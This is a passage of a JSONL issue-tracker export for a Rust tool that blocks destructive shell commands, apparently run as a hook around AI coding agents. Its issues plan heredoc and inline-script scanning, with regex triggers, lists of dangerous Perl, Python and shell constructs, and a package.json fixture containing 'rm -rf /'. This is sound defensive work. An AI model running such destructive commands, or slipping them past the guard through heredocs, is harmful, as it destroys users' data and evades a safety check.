infrastructure)\n- May influence choice of ast-grep vs tree-sitter-rust\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:36:56.104462373-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:37:02.97601574-05:00","dependencies":[{"issue_id":"git_safety_guard-2cu","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:37:02.996636534-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2cu","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:37:03.01736459-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2cu","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:02:17.777570479-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-2d4","title":"Define Perl destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous Perl constructs within heredoc bodies.\n\n## Why This Matters\n\nPerl heredocs are a classic attack vector because:\n1. Perl is often used for system administration scripts\n2. system(), exec(), backticks are core features\n3. Perl's \"TIMTOWTDI\" philosophy means many ways to do dangerous things\n4. Perl heredocs have complex quoting semantics\n\n## Pattern Categories to Define\n\n### Shell Execution\n- system() and exec() calls\n- Backtick commands `cmd`\n- qx// operator (equivalent to backticks)\n- open() with pipe syntax (open FH, \"|cmd\" or \"cmd|\")\n- IPC::Open2, IPC::Open3\n\n### Filesystem Operations\n- unlink() for file deletion\n- rmdir() for directory removal\n- File::Path::rmtree\n- rename() and link() for file manipulation\n\n### Dangerous Built-ins\n- eval() for code execution\n- do EXPR for executing files\n- require/use with dynamic paths\n- AUTOLOAD abuse\n\n### Regular Expression Dangers\n- /e modifier (eval in regex replacement)\n- Regex denial of service patterns\n- (?{code}) embedded code in regex\n\n### Process Control\n- kill() on processes\n- fork() and wait()\n- alarm() and signal handlers\n\n### Data Handling\n- Two-argument open() (security risk)\n- Reading from tainted input\n- LWP/HTTP::Tiny for network access\n\n## Implementation Notes\n\nPerl is notoriously hard to parse correctly. Challenges include:\n- Context-dependent syntax\n- Sigils ($, @, %, *)\n- Barewords vs strings vs subroutines\n- Regular expression complexity\n- Here-doc quoting variations\n\ntree-sitter-perl exists but may have limitations for complex Perl.\n\n## Test Cases\n\nPerl-specific tests:\n- Various quoting mechanisms\n- Regex with embedded code\n- open() variants\n- Sigil interpolation\n\n## Dependencies\n\n- Pattern library structure design\n- ast-grep invocation layer\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:37:19.324205765-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:37:26.492349961-05:00","dependencies":[{"issue_id":"git_safety_guard-2d4","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:37:37.366046506-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2d4","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:37:37.385299864-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-2j3","title":"Research tree-sitter Rust bindings","description":"# Research tree-sitter Rust Bindings\n\n## Objective\nEvaluate direct tree-sitter integration as an alternative to ast-grep CLI.\n\n## Background\ntree-sitter is the underlying parsing library used by ast-grep. Using it directly could offer:\n- Lower latency (no process spawning)\n- More control over parsing\n- Smaller dependency footprint (maybe)\n\nHowever, it may require more work to implement pattern matching.\n\n## Research Areas\n\n### 1. tree-sitter Rust Crate\n- API documentation and examples\n- How to load language grammars\n- Parsing API (parse string, get AST)\n- Query API for pattern matching\n\n### 2. Language Grammar Crates\n- tree-sitter-python\n- tree-sitter-bash\n- tree-sitter-javascript\n- tree-sitter-typescript\n- tree-sitter-ruby\n- How are grammars distributed? (separate crates vs bundled)\n\n### 3. Query Language\n- S-expression query syntax\n- Captures and predicates\n- Multiple patterns in one query\n- Performance of compiled queries\n\n### 4. Build Complexity\n- Compile time impact\n- Binary size impact\n- Cross-compilation considerations\n- Grammar file generation (if needed)\n\n### 5. Comparison with ast-grep\n- Feature parity\n- Development effort\n- Maintenance burden\n- Community support\n\n## Deliverables\n- Document comparing tree-sitter direct vs ast-grep\n- Code examples for both approaches\n- Recommendation with justification\n\n## Success Criteria\n- Clear understanding of trade-offs\n- Can make informed architecture decision\n- Have working proof-of-concept for both approaches","notes":"Research completed: tree-sitter v0.26.3 available with 11M+ downloads. Language grammars: tree-sitter-bash, tree-sitter-python, tree-sitter-javascript all at ^0.23.0. Ruby available, Perl uncertain.","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:28:46.751144719-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:46:14.52717456-05:00"}
{"id":"git_safety_guard-2ta","title":"Implement two-tier detection architecture (regex + ast-grep)","description":"## Objective\n\nImplement a tiered detection architecture that balances performance with detection accuracy for heredoc and inline script analysis.\n\n## Background\n\nA single-pass approach cannot satisfy both performance and accuracy requirements:\n- Fast regex detection may miss complex obfuscation\n- Full AST parsing is too slow for every command\n\nThe solution is a **tiered architecture** where each tier acts as a gate for the next.\n\n## Three-Tier Architecture\n\n### Tier 1: Trigger Detection (RegexSet)\n\n**Purpose:** Ultra-fast detection of heredoc/inline script indicators\n\n**Latency Budget:** \u003c100Î¼s (target \u003c10Î¼s for non-matching)\n\n**Implementation:**\n```rust\nstatic HEREDOC_TRIGGERS: LazyLock\u003cRegexSet\u003e = LazyLock::new(|| {\n    RegexSet::new([\n        r\"\u003c\u003c-?\\s*['\\\"]?\\w+['\\\"]?\",     // Heredoc operators\n        r\"\u003c\u003c\u003c\",                          // Here-strings\n        r\"\\b(python3?|python)\\s+-[ce]\\s\",\n        r\"\\b(ruby|irb)\\s+-e\\s\",\n        r\"\\bperl\\s+-[eE]\\s\",\n        r\"\\bnode\\s+-[ep]\\s\",\n        r\"\\b(sh|bash|zsh)\\s+-c\\s\",\n        r\"\\|\\s*(python3?|ruby|perl|node|sh|bash)\\b\",\n    ]).expect(\"valid patterns\")\n});\n```\n\n**Guarantees:**\n- Zero allocations on non-match path\n- ZERO false negatives (may have false positives)\n- If Tier 2 would find a heredoc, Tier 1 MUST trigger\n\n### Tier 2: Content Extraction\n\n**Purpose:** Extract heredoc/inline script content with safety bounds\n\n**Latency Budget:** \u003c1ms (including I/O)\n\n**Implementation:**\n```rust\npub struct ExtractionLimits {\n    pub max_body_bytes: usize,      // 1MB default\n    pub max_body_lines: usize,      // 10,000 default\n    pub max_heredocs: usize,        // 10 per command\n    pub timeout_ms: u64,            // 50ms default\n}\n\npub struct ExtractedContent {\n    pub content: String,\n    pub language: Language,\n    pub delimiter: String,\n    pub byte_range: Range\u003cusize\u003e,\n}\n```\n\n**Guarantees:**\n- Bounded memory usage (never allocate \u003e1MB per heredoc)\n- Bounded time (timeout after 50ms)\n- Graceful degradation on malformed input (fail-open with warning)\n\n### Tier 3: AST Pattern Matching\n\n**Purpose:** Structural pattern matching for destructive operations\n\n**Latency Budget:** \u003c5ms per heredoc (typical), \u003c20ms worst case\n\n**Implementation:**\n```rust\nuse ast_grep_core::{Pattern, Matcher};\n\npub struct AstMatcher {\n    patterns: HashMap\u003cLanguage, Vec\u003cCompiledPattern\u003e\u003e,\n}\n\nimpl AstMatcher {\n    pub fn find_matches(\u0026self, content: \u0026str, lang: Language) -\u003e Vec\u003cPatternMatch\u003e;\n}\n```\n\n**Guarantees:**\n- Timeout protection (abort after 20ms)\n- Fail-open on parse errors\n- Language-specific patterns (no cross-language confusion)\n\n## Tier Flow Diagram\n\n```\nCommand Input\n     â”‚\n     â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚ Tier 1: Trigger â”‚ â”€â”€â”€ No match â”€â”€â–º ALLOW (fast path)\nâ”‚   (\u003c100Î¼s)      â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n         â”‚ Match\n         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚ Tier 2: Extract â”‚ â”€â”€â”€ Error/Timeout â”€â”€â–º ALLOW + warn\nâ”‚   (\u003c1ms)        â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n         â”‚ Success\n         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚ Tier 3: AST     â”‚ â”€â”€â”€ No match â”€â”€â–º ALLOW\nâ”‚   (\u003c5ms)        â”‚ â”€â”€â”€ Match â”€â”€â–º BLOCK\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## Performance Budgets Summary\n\n| Tier | Operation | Target | Panic Threshold |\n|------|-----------|--------|-----------------|\n| 1 | Trigger detection | \u003c10Î¼s | \u003e100Î¼s |\n| 2 | Content extraction | \u003c500Î¼s | \u003e2ms |\n| 3 | AST parse + match | \u003c5ms | \u003e20ms |\n| Total | End-to-end heredoc | \u003c10ms | \u003e50ms |\n\n## Error Handling\n\nAll tiers follow **fail-open** semantics:\n- Timeout â†’ ALLOW + log warning\n- Parse error â†’ ALLOW + log warning\n- OOM protection â†’ ALLOW + log warning\n\nRationale: A hung or crashed hook is worse than a missed detection.\n\n## Test Requirements\n\n- Tier 1 must have ZERO false negatives (property test)\n- Tier 2 must handle malformed input without panic (fuzz test)\n- Tier 3 must timeout gracefully (integration test)\n- End-to-end latency must stay within budget (benchmark)\n\n## Acceptance Criteria\n\n- Tier 1 triggers on all heredoc patterns from the test corpus\n- Tier 2 extracts content correctly for all supported syntaxes\n- Tier 3 detects all known destructive patterns per language\n- Total latency stays within budget for 99th percentile","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T19:30:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:22:10.023598326-05:00","dependencies":[{"issue_id":"git_safety_guard-2ta","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:56:44.30180478-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2ta","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:56:44.343696983-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-300","title":"Implement package.json scripts extractor","description":"## Objective\n\nImplement an extractor for package.json files to detect executable npm script contexts.\n\n## File Pattern\n\n- `package.json`\n\n## Extraction Targets\n\n### Scripts Block (executed)\n- All values in `scripts` object\n- Lifecycle scripts (preinstall, postinstall, etc.)\n\n### NOT Extracted (data only)\n- `description`\n- `keywords`\n- `repository`\n- `config` values\n- Comments (JSON5 only)\n\n## Example\n\n```json\n{\n  \"scripts\": {\n    \"clean\": \"rm -rf dist/*\",  // EXTRACT THIS\n    \"nuke\": \"rm -rf /\"  // EXTRACT THIS\n  },\n  \"description\": \"Uses rm -rf for cleanup\"  // DO NOT extract\n}\n```\n\n## Security Note\n\nnpm scripts are especially dangerous because:\n- `npm install` runs lifecycle scripts automatically\n- `postinstall` is a common attack vector\n\n## Acceptance Criteria\n\n- Correctly extracts all script values with line numbers\n- Handles standard JSON format\n- Ignores non-script fields\n- Unit tests with representative fixtures","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T21:24:57.322775825-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:24:57.322775825-05:00","dependencies":[{"issue_id":"git_safety_guard-300","depends_on_id":"git_safety_guard-scan","type":"blocks","created_at":"2026-01-07T21:25:20.613732239-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-49s","title":"Implement heredoc syntax detection (regex quick-check)","description":"# Implement Heredoc Syntax Detection (Regex Quick-Check)\n\n## Objective\nImplement a fast regex-based detector that identifies commands potentially containing heredoc content.\n\n## Background\nBefore we can scan heredoc content, we need to detect its presence. This is a two-stage approach:\n1. Quick regex check (this task) - fast, may have false positives\n2. Full extraction (separate task) - accurate, only runs if quick check triggers\n\n## Implementation Details\n\n### Quick-Check Patterns\nThe quick check should match common heredoc indicators:\n\n```rust\n// Patterns to detect heredoc presence\nstatic HEREDOC_QUICK_PATTERNS: \u0026[\u0026str] = \u0026[\n    r\"\u003c\u003c[-~]?\\s*['\\\"]?\\w+['\\\"]?\",  // \u003c\u003c EOF, \u003c\u003c- 'EOF', \u003c\u003c~ \"END\"\n    r\"\u003c\u003c\u003c\\s*['\\\"]\",                 // \u003c\u003c\u003c \"here string\"\n    r\"-c\\s+['\\\"]\",                  // python -c \"code\", bash -c 'code'\n    r\"-e\\s+['\\\"]\",                  // node -e \"code\", perl -e 'code'\n];\n```\n\n### Integration Point\nAdd to the main processing pipeline after quick-reject but before pattern matching:\n\n```rust\nfn process_command(cmd: \u0026str) -\u003e Decision {\n    // Existing quick-reject (no git/rm)\n    if quick_reject(cmd) \u0026\u0026 global_quick_reject(cmd) {\n        return Decision::Allow;\n    }\n    \n    // NEW: Check for potential heredoc content\n    if has_potential_heredoc(cmd) {\n        if let Some(reason) = scan_heredoc_content(cmd) {\n            return Decision::Deny(reason);\n        }\n    }\n    \n    // Continue with existing pattern matching...\n}\n```\n\n### Performance Requirements\n- Quick check must complete in \u003c 0.5ms\n- Should not allocate on the hot path\n- Use lazy-compiled static patterns\n\n### False Positive Tolerance\n- Quick check can have false positives (triggers full scan unnecessarily)\n- Quick check must NOT have false negatives (miss actual heredocs)\n- Full scan will handle false positives gracefully\n\n## Files to Modify\n- src/packs/mod.rs or new src/heredoc/mod.rs\n- src/main.rs (pipeline integration)\n\n## Testing\n- Test each heredoc variant is detected\n- Test non-heredoc commands don't trigger\n- Benchmark quick check performance\n\n## Dependencies\n- Design: heredoc detection strategy (git_safety_guard-o15)\n- ADR approved (git_safety_guard-5ib)\n\n## Success Criteria\n- All heredoc variants from design doc are detected\n- Quick check adds \u003c 0.5ms to non-heredoc commands\n- Zero false negatives in test suite","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:30:59.514233315-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:30:59.514233315-05:00","dependencies":[{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-5ib","type":"blocks","created_at":"2026-01-07T18:31:05.994685018-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T18:56:44.362201361-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T19:28:32.390746435-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-4o8","title":"Create documentation for heredoc detection feature","description":"## Objective\n\nCreate comprehensive documentation for the heredoc detection feature, covering user configuration, pattern authoring, and security considerations.\n\n## Documentation Deliverables\n\n### 1. User Guide Updates\n\n#### README.md Updates\n- Add heredoc scanning to feature list\n- Document new command-line options (if any)\n- Update configuration examples\n\n#### Configuration Guide\n- How to enable/disable heredoc scanning\n- Language-specific configuration\n- Performance tuning options\n- Fallback behavior settings\n\n### 2. Pattern Authoring Guide\n\nNew document: `docs/patterns.md`\n\n#### Pattern Syntax\n- tree-sitter query syntax (if using queries)\n- ast-grep pattern syntax (if using ast-grep-core)\n- Examples for each supported language\n\n#### Adding New Patterns\n- Step-by-step guide\n- Testing requirements\n- Performance considerations\n- Review checklist\n\n#### Pattern Library Reference\n- Complete list of all patterns\n- What each pattern detects\n- Known limitations\n- False positive/negative notes\n\n### 3. Security Documentation\n\nNew document: `docs/security.md`\n\n#### Threat Model\n- Attack vectors heredoc detection addresses\n- Attack vectors explicitly out of scope\n- Assumptions and limitations\n\n#### Bypass Considerations\n- Known potential bypasses\n- Why certain bypasses are accepted\n- Defense in depth recommendations\n\n#### Incident Response\n- What to do if a command is wrongly blocked\n- What to do if a dangerous command gets through\n- How to report security issues\n\n### 4. Developer Documentation\n\n#### Architecture Overview\n- Pipeline flow diagram\n- Module responsibilities\n- Data flow through heredoc analysis\n\n#### API Documentation\n- Internal Rust API documentation (rustdoc)\n- Integration points for extending\n- Error handling patterns\n\n#### Contributing Guide Updates\n- How to add new language support\n- How to add new patterns\n- Testing requirements for contributions\n\n### 5. AGENTS.md Updates\n\nUpdate the AI agent guidelines:\n- New heredoc detection capabilities\n- How to test heredoc patterns\n- False positive handling guidance\n\n## Documentation Quality Requirements\n\n- All code examples must be tested\n- All configuration examples must be valid\n- Mermaid diagrams for complex flows\n- Cross-references between related docs\n- Version numbers where relevant\n\n## Dependencies\n\n- Feature implementation complete\n- Test suite passing\n- Performance benchmarks available\n- ADR finalized\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:40:41.014282391-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:40:53.349791375-05:00","dependencies":[{"issue_id":"git_safety_guard-4o8","depends_on_id":"git_safety_guard-8wt","type":"blocks","created_at":"2026-01-07T18:40:53.36819319-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-5ib","title":"Write architecture decision document (ADR)","description":"# Write Architecture Decision Document (ADR)\n\n## Objective\nSynthesize research findings into a formal Architecture Decision Record that guides implementation.\n\n## Background\nAfter completing research on ast-grep, tree-sitter, and design tasks, we need to document the chosen approach and rationale. This ADR will be the reference for all implementation work.\n\n## ADR Structure\n\n### 1. Title\n\"ADR-001: Heredoc Scanning Architecture\"\n\n### 2. Status\nProposed -\u003e Accepted -\u003e Implemented\n\n### 3. Context\n- Problem statement (heredoc bypass attacks)\n- Constraints (performance, dependencies, maintenance)\n- Options considered\n\n### 4. Decision\n- Chosen approach (ast-grep CLI vs library vs tree-sitter direct)\n- Pattern storage format\n- Integration points with existing dcg architecture\n\n### 5. Consequences\n- Benefits of chosen approach\n- Drawbacks and mitigations\n- Future considerations\n\n### 6. Technical Details\n- Dependency changes to Cargo.toml\n- New modules and their responsibilities\n- Data flow through the system\n- Configuration schema additions\n\n## Key Decisions to Document\n\n### Integration Approach\n- CLI invocation vs library\n- Sync vs async processing\n- Caching strategy\n\n### Language Support\n- Initial language set\n- Grammar distribution\n- Extension mechanism\n\n### Pattern Format\n- Hardcoded vs external\n- File format (YAML, TOML, custom)\n- Validation approach\n\n### Performance Strategy\n- Quick-reject optimizations\n- Lazy loading\n- Timeout handling\n\n### Error Handling\n- Parse failures\n- Unknown languages\n- Pattern match errors\n\n## Deliverables\n- ADR document in docs/adr/001-heredoc-scanning.md\n- Updated AGENTS.md with implementation notes\n- Diagram showing data flow\n\n## Dependencies\n- Research: ast-grep API (git_safety_guard-b45)\n- Research: tree-sitter bindings (git_safety_guard-2j3)\n- Design: heredoc detection (git_safety_guard-o15)\n- Design: language detection (git_safety_guard-jfj)\n- Design: pattern library (git_safety_guard-6sg)\n\n## Success Criteria\n- Clear, actionable decisions documented\n- All stakeholder concerns addressed\n- Implementation can proceed without ambiguity","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:30:31.162229073-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:30:31.162229073-05:00","dependencies":[{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:30:37.437715869-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:30:37.457081439-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-o15","type":"blocks","created_at":"2026-01-07T18:30:37.477144052-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-jfj","type":"blocks","created_at":"2026-01-07T18:30:37.496865872-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:30:37.516274063-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-boy","type":"blocks","created_at":"2026-01-07T18:39:09.196463586-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-6sg","title":"Design destructive pattern library structure","description":"# Design Destructive Pattern Library Structure\n\n## Objective\nDesign the structure and organization of language-specific destructive patterns for heredoc scanning.\n\n## Background\nEach supported language has its own idioms for destructive operations. We need a well-organized pattern library that:\n- Is maintainable and extensible\n- Integrates with the existing pack system\n- Provides clear documentation for each pattern\n\n## Pattern Categories by Language\n\n### Python Patterns\n- File system: os.remove, os.unlink, shutil.rmtree, pathlib.Path.unlink\n- Process execution: os.system, subprocess.run/call/Popen\n- Database: DROP TABLE, TRUNCATE (via string in execute())\n\n### Bash Patterns\n- File deletion: rm, unlink, shred\n- Git operations: git reset, git clean, git checkout (destructive forms)\n- System: reboot, shutdown, init\n\n### JavaScript/Node Patterns\n- File system: fs.rmSync, fs.unlinkSync, fs.rmdirSync\n- Process: child_process.exec, child_process.spawn\n- Database operations in strings\n\n### Ruby Patterns\n- FileUtils.rm_rf, File.delete, Dir.rmdir\n- system(), exec(), backticks\n- Database operations\n\n### Perl Patterns\n- unlink, rmdir, rmtree\n- system(), exec(), backticks\n- Database operations\n\n## Design Considerations\n\n### 1. Pattern Specification Format\nShould patterns be:\n- Hardcoded in Rust?\n- Loaded from YAML/TOML files?\n- ast-grep rule files?\n\nTrade-offs:\n- Hardcoded: Fast, type-safe, harder to update\n- External files: Flexible, slower to load, easier to contribute\n- Hybrid: Core patterns hardcoded, extensions in files\n\n### 2. Pattern Metadata\nEach pattern needs:\n- Unique ID\n- Language\n- ast-grep/tree-sitter pattern\n- Human-readable description\n- Severity level\n- False positive likelihood\n- Suggested alternative\n\n### 3. Pack Integration\nHow do heredoc patterns integrate with existing packs?\n- New pack category: heredoc.*?\n- Sub-patterns within existing packs?\n- Separate configuration section?\n\n### 4. Contextual Patterns\nSome patterns are only dangerous in context:\n- subprocess.run is fine for \"ls\", dangerous for \"rm\"\n- Need to check arguments, not just function calls\n- May require more complex pattern matching\n\n### 5. Allowlisting\nUsers need to allowlist legitimate uses:\n- Test files that exercise dangerous code paths\n- Documentation containing examples\n- CI scripts that intentionally clean up\n\n## Deliverables\n- Pattern specification format (schema)\n- Initial pattern inventory per language\n- Integration plan with pack system\n- Allowlist/exception mechanism design\n\n## Success Criteria\n- Clear, consistent pattern format\n- Coverage of top 10 dangerous patterns per language\n- Smooth integration with existing dcg architecture\n- Path for community contributions","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:30:05.921495349-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:30:05.921495349-05:00","dependencies":[{"issue_id":"git_safety_guard-6sg","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:30:14.503126907-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-6sg","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:30:14.524054168-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-7f5","title":"Implement two-tier detection architecture (regex + ast-grep)","description":"# Two-Tier Architecture for Heredoc Detection\n\n## Key Insight\n\nThe architecture uses a **two-tier approach** to balance performance with accuracy:\n\n1. **Tier 1**: Use fast regex for heredoc detection (the `regex` crate uses Aho-Corasick for static compound patterns and SIMD - it's extremely optimized)\n2. **Tier 2**: Once a heredoc is detected, use AST-aware parsing (ast-grep) rather than reimplementing structural analysis badly with regex\n\nThis ensures 99%+ of commands (which don't contain heredocs) pay only microseconds of overhead, while heredoc commands get proper structural analysis.\n\n## Architecture\n\n```\nCommand Input\n     â”‚\n     â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚  TIER 1: Fast Regex Detection (Î¼s)          â”‚\nâ”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€  â”‚\nâ”‚  â€¢ regex crate (Aho-Corasick + SIMD)        â”‚\nâ”‚  â€¢ Static pattern set for heredoc markers   â”‚\nâ”‚  â€¢ Quick reject: 99%+ commands pass through â”‚\nâ”‚  â€¢ Cost: ~1-10 microseconds                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n     â”‚\n     â”‚ heredoc detected?\n     â”‚\n     â”œâ”€â”€â”€â”€ NO â”€â”€â”€â–¶ Continue to existing pattern matching\n     â”‚\n     â–¼ YES\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚  TIER 2: AST-Aware Analysis (ms)            â”‚\nâ”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€  â”‚\nâ”‚  â€¢ ast-grep-core for structural parsing     â”‚\nâ”‚  â€¢ Language-specific pattern matching       â”‚\nâ”‚  â€¢ Only invoked when heredocs found         â”‚\nâ”‚  â€¢ Cost: ~1-5 milliseconds                  â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n     â”‚\n     â–¼\n  Block/Allow Decision\n```\n\n## Tier 1: Regex-Based Heredoc Detection\n\n### Why `regex` crate?\n\nThe Rust `regex` crate is extraordinarily optimized:\n- **Aho-Corasick**: Multi-pattern matching in O(n) time\n- **SIMD**: Vectorized string operations (AVX2, SSE4.2)\n- **Lazy DFA**: JIT-compiled automata\n- **No backtracking**: Guaranteed linear time\n\n### Heredoc Markers to Detect\n\n```rust\nuse regex::RegexSet;\n\nstatic HEREDOC_PATTERNS: LazyLock\u003cRegexSet\u003e = LazyLock::new(|| {\n    RegexSet::new([\n        // Bash heredocs\n        r\"\u003c\u003c-?\\s*['\\\"]?\\w+['\\\"]?\",      // \u003c\u003cEOF, \u003c\u003c'EOF', \u003c\u003c\"EOF\", \u003c\u003c-EOF\n        r\"\u003c\u003c\u003c\",                           // Here-string\n\n        // Inline script flags\n        r\"\\b(python3?|ruby|perl|node)\\s+-[ec]\\s\",\n        r\"\\bsh\\s+-c\\s\",\n        r\"\\bbash\\s+-c\\s\",\n\n        // Pipe to interpreter\n        r\"\\|\\s*(python3?|ruby|perl|node|sh|bash)\\b\",\n    ]).expect(\"heredoc patterns should compile\")\n});\n```\n\n### Quick Reject Logic\n\n```rust\nfn might_contain_heredoc(cmd: \u0026str) -\u003e bool {\n    HEREDOC_PATTERNS.is_match(cmd)\n}\n```\n\nCost: **~1-10 microseconds** for typical commands.\n\n## Tier 2: AST-Aware Analysis\n\nOnly invoked when Tier 1 detects a potential heredoc.\n\n### Why ast-grep?\n\n- **Structural matching**: Understands code structure, not just text\n- **Language-aware**: Different patterns for Python vs Bash vs JS\n- **Pattern syntax**: Intuitive `os.system($CMD)` instead of regex\n- **Battle-tested**: Used in production for large-scale code search\n\n### Example Flow\n\n```rust\nfn check_heredoc(cmd: \u0026str) -\u003e Option\u003cCheckResult\u003e {\n    // Tier 1: Quick regex check\n    if !might_contain_heredoc(cmd) {\n        return None;  // Fast path: no heredoc\n    }\n\n    // Tier 2: Extract and analyze heredoc content\n    let heredoc_info = extract_heredoc(cmd)?;\n    let language = detect_language(\u0026heredoc_info);\n\n    // Parse with ast-grep\n    let matches = match_destructive_patterns(\u0026heredoc_info.content, language);\n\n    if !matches.is_empty() {\n        return Some(CheckResult::blocked(\n            \u0026format!(\"Heredoc contains dangerous pattern: {}\", matches[0].reason),\n            \"heredoc\"\n        ));\n    }\n\n    None  // Heredoc is safe\n}\n```\n\n## Performance Budget\n\n| Operation | Budget | Typical |\n|-----------|--------|---------|\n| Tier 1 regex check | \u003c100Î¼s | 1-10Î¼s |\n| Heredoc extraction | \u003c1ms | 100-500Î¼s |\n| Language detection | \u003c100Î¼s | 10-50Î¼s |\n| AST parsing | \u003c5ms | 500Î¼s-2ms |\n| Pattern matching | \u003c1ms | 100-500Î¼s |\n| **Total (heredoc path)** | \u003c10ms | 1-5ms |\n\n## Implementation Priority\n\n1. **First**: Implement Tier 1 with `regex` crate\n2. **Second**: Add heredoc extraction logic\n3. **Third**: Integrate ast-grep for Tier 2\n4. **Fourth**: Optimize based on benchmarks\n\n## Dependencies\n\n```toml\n# Tier 1: Fast regex\nregex = \"1.10\"  # Already highly optimized\n\n# Tier 2: AST analysis\nast-grep-core = \"0.40\"\nast-grep-language = { version = \"0.37\", features = [\"bash\", \"python\", \"javascript\"] }\n```\n","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T18:54:46.613326588-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:37:42.934624617-05:00","closed_at":"2026-01-07T19:37:42.934624617-05:00","close_reason":"Duplicate of 